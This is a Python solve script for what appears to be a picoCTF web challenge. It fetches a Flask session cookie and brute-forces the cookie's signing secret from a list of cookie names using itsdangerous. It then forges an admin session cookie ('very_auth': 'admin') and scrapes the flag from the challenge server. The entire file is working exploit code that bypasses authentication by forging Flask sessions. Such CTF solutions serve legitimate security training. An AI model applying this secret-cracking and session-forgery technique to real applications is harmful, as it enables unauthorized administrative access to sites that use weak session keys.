import requests
import re
import hashlib
from flask.json.tag import TaggedJSONSerializer
from itsdangerous import URLSafeTimedSerializer, TimestampSigner, BadSignature

cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]

def get_cookie(cookie_name):
    session = requests.Session()
    r = session.post('http://mercury.picoctf.net:44693/search', data={'name': cookie_name})

    return r.headers["Set-Cookie"].split("; ")[0]

def get_secret(cookie):
    for cookie_name in cookie_names:
        try:
            serializer = URLSafeTimedSerializer(
                secret_key=cookie_name,
                salt='cookie-session',
                serializer=TaggedJSONSerializer(),
                signer=TimestampSigner,
                signer_kwargs={
                    'key_derivation': 'hmac',
                    'digest_method': hashlib.sha1
                }).loads(cookie.split("=")[1])
        except BadSignature:
            continue

        return cookie_name

def make_admin_cookie(secret):
    return (URLSafeTimedSerializer(
        secret_key=secret,
        salt='cookie-session',
        serializer=TaggedJSONSerializer(),
        signer=TimestampSigner,
        signer_kwargs={
            'key_derivation': 'hmac',
            'digest_method': hashlib.sha1
        }
    ).dumps({'very_auth' : 'admin'}))

def get_flag(cookie):
    session = requests.Session()
    r = session.get('http://mercury.picoctf.net:44693/display', headers={'Cookie': f"session={cookie}"})

    return re.findall("picoCTF{[a-zA-Z0-9_]+}", r.text)


if __name__ == "__main__":
    cookie = get_cookie(cookie_names[0])

    secret = get_secret(cookie)
    print("real secret", secret)

    admin_cookie = make_admin_cookie(secret)

    flags = get_flag(admin_cookie)
    print("flags", flags[0])